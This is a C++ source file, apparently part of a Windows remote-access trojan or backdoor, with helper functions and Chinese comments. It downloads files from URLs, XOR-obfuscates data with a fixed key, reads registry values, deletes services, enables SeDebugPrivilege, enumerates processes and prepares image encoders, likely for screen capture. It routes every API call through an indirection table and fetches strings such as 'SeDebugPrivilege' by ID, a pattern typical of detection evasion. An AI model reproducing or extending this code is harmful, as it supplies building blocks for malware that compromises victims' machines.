// MyMainFunc.cpp: implementation of the MyMainFunc class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyMainFunc.h"
#include "lzw.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


MyMainFunc::MyMainFunc()
{

}

MyMainFunc::~MyMainFunc()
{

}

BOOL MyMainFunc::GetUrlFile(char* pUrlPath, char* m_FilePath)
{
	//初始化HTTP环境
	HINTERNET hIe = m_gFunc.InternetOpen("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if(!hIe) 
	{
		return FALSE;
	}

	//建立HTTP连接,上送数据
	HINTERNET hFp = m_gFunc.InternetOpenUrl(hIe, pUrlPath, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_RELOAD, 0);
	if(!hFp)
	{
		m_gFunc.InternetCloseHandle(hIe);
		return FALSE; 
	}

	//200
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10205, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//查看返回码
	char sCode[256] = {0};
	DWORD nSize = 250;
	DWORD nIndex = 0;
	if(!m_gFunc.HttpQueryInfo(hFp, HTTP_QUERY_STATUS_CODE, sCode, &nSize, &nIndex) || m_gFunc.strcmp(sCode, m_TmpStr))
	{
		m_gFunc.InternetCloseHandle(hFp);
		m_gFunc.InternetCloseHandle(hIe);
		return FALSE;
	}

	HANDLE hFile = m_gFunc.CreateFile(m_FilePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_gFunc.InternetCloseHandle(hFp);
		m_gFunc.InternetCloseHandle(hIe);
		return FALSE;
	}
	
	BOOL bIsSuccess = FALSE;
	BYTE  pDatabuf[4096];
	DWORD dwNumberOfBytesReaded = 0;
	DWORD nWriteLen = 0;
	while(1)
	{
		if(!m_gFunc.InternetReadFile(hFp, pDatabuf, 4000, &dwNumberOfBytesReaded))
		{
			break;
		}

		if(dwNumberOfBytesReaded == 0)
		{
			bIsSuccess = TRUE; 
			break;
		}
		else
		{
			m_gFunc.WriteFile(hFile, pDatabuf, dwNumberOfBytesReaded, &nWriteLen, NULL);
		}
	}

	m_gFunc.CloseHandle(hFile);
	m_gFunc.InternetCloseHandle(hFp);
	m_gFunc.InternetCloseHandle(hIe);
	return bIsSuccess;
}

void MyMainFunc::EncryptByte(LPVOID pData, DWORD nLen)
{
	BYTE* pTmpData = (BYTE*) pData;
	for(DWORD i = 0; i < nLen; i++)
	{
		pTmpData[i] = pTmpData[i] ^ PS_ENTRY_COMM_KEY;	
	}
}

BOOL MyMainFunc::GetStrValue(LPCTSTR pStr, LPCTSTR pName, LPTSTR pValue)
{
	char m_Str[MAX_PATH] = {0};
	char m_Name[MAX_PATH] = {0};
	char m_Value[MAX_PATH] = {0};
	m_gFunc.sprintf(m_Name, "%s=", pName);
	m_gFunc.strcpy(m_Str, pStr);

	char* pStart = m_gFunc.strstr(m_Str, pName);
	if(pStart == NULL)
	{
		return FALSE;
	}
	pStart += m_gFunc.strlen(m_Name);
	
	char* pEnd = m_gFunc.strchr(pStart, ';');
	if(pEnd == NULL)
	{
		pEnd = m_Str + m_gFunc.strlen(m_Str);
	}
	m_gFunc.memcpy(pValue, pStart, (pEnd - pStart) * sizeof(char));
	pValue[pEnd - pStart] = 0;
	return TRUE;
}

BOOL MyMainFunc::MyGetKeyStr(HKEY hKey, LPCTSTR Title, LPCTSTR KeyName, BYTE* KeyValue)
{
	HKEY m_key = NULL;
	long ret = m_gFunc.RegOpenKeyEx (hKey, Title, 0, KEY_ALL_ACCESS, &m_key);
	if(ret != ERROR_SUCCESS)
	{
		return FALSE;
	}

	BYTE m_KeyValue[MAX_PATH] = {0};
	DWORD len = MAX_PATH;
	ret = m_gFunc.RegQueryValueEx(m_key, KeyName, 0, NULL, m_KeyValue, &len);
	if(ret != ERROR_SUCCESS)
	{
		m_gFunc.RegCloseKey(m_key);
		return FALSE;
	}
	m_gFunc.memcpy(KeyValue, m_KeyValue, len);
	ret = m_gFunc.RegCloseKey(m_key);
	if(ret != ERROR_SUCCESS)
	{
		return FALSE;
	}
	return TRUE;
}

BOOL MyMainFunc::ReadMyFile(LPCTSTR m_FileName, BYTE** pFileData, DWORD* nFileLen)
{
	HANDLE hFile = m_gFunc.CreateFile(m_FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	*nFileLen = m_gFunc.GetFileSize(hFile, NULL);
	if(*nFileLen <= 0)
	{
		m_gFunc.CloseHandle(hFile);
		return FALSE;
	}
	*pFileData = new BYTE[*nFileLen];
	m_gFunc.ReadFile(hFile, *pFileData, *nFileLen, &nReadLen, NULL);
	m_gFunc.CloseHandle(hFile);
	return TRUE;
}


BOOL MyMainFunc::WriteMyFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen)
{
	HANDLE hFile = m_gFunc.CreateFile(m_FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nWriteLen = 0;
	m_gFunc.WriteFile(hFile, pData, nLen, &nWriteLen, NULL);
	m_gFunc.CloseHandle(hFile);
	return TRUE;
}

BOOL MyMainFunc::DeleteMyService(LPCTSTR ServiceName)
{
	SC_HANDLE mgr = NULL, srv = NULL;
	mgr = m_gFunc.OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(!mgr) 
	{
		return FALSE;
	}

	//检查服务是否存在
	srv = m_gFunc.OpenService(mgr, ServiceName, SERVICE_ALL_ACCESS);
	if(!srv)
	{
		m_gFunc.CloseServiceHandle(mgr);
		return FALSE;
	}

	BOOL ret = m_gFunc.DeleteService(srv);
	m_gFunc.CloseServiceHandle(srv);
	m_gFunc.CloseServiceHandle(mgr);
	return ret;
}

void MyMainFunc::GetMoudleMame(DWORD pId, char* pExeName)
{
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
    if(NULL == hProcess) 
	{
		return;
	}
	char m_ExeName[MAX_PATH] = {0};
	if(m_gFunc.GetModuleFileNameEx(hProcess, NULL, m_ExeName, 1024) > 0)
	{
		m_gFunc.strcpy(pExeName, m_ExeName);
	}
    m_gFunc.CloseHandle(hProcess);
}

void MyMainFunc::GetMyToken()
{
	//SeDebugPrivilege
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10217, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	// 给枚举的进程增加SE_DEBUG_NAME权限即可：
	HANDLE hToken;              // handle to process token 
	TOKEN_PRIVILEGES tkp;       // pointer to token structure 
	m_gFunc.OpenProcessToken(m_gFunc.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); 
	m_gFunc.LookupPrivilegeValue(NULL, m_TmpStr, &tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	m_gFunc.AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 
}

int MyMainFunc::GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT  num = 0;          
	UINT  size = 0;   
	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if(size == 0)
	{
		return -1;
	}

	BYTE* pData = new BYTE[size];
	pImageCodecInfo = (ImageCodecInfo*) pData;

	GetImageEncoders(num, size, pImageCodecInfo);
	for(UINT j = 0; j < num; ++j)
	{
		if(m_gFunc.lstrcmpW(pImageCodecInfo[j].MimeType, format) == 0 )
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			delete [] pData;
			return j;
		}    
	}
	delete [] pData;
	return -1;
}

BOOL MyMainFunc::CheckProcessIsExist(char* sProcessName)
{
	//SeDebugPrivilege
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10217, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	m_gFunc.CharLower(sProcessName);

	//枚举当前系统进程列表
	HANDLE hToken = NULL;  
	TOKEN_PRIVILEGES tkp = {0};   
	m_gFunc.OpenProcessToken(m_gFunc.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); 
	m_gFunc.LookupPrivilegeValue(NULL, m_TmpStr, &tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	m_gFunc.AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 
	DWORD dId[4096] = {0};
	DWORD nSize = 0;
	if(!m_gFunc.EnumProcesses(dId, sizeof(DWORD) * 4096, &nSize))
	{
		return FALSE;
	}

	//查看进程列表中此进程是否存在
	for(DWORD i = 0; i < nSize / sizeof(DWORD); i++)
	{
		TCHAR m_EnumProcessName[256] = {0};
		GetMoudleMame(dId[i], m_EnumProcessName);
		m_gFunc.CharLower(m_EnumProcessName);

		if(m_gFunc.strstr(m_EnumProcessName, sProcessName) != NULL)
		{
			return TRUE;
		}
	}
	return FALSE;
}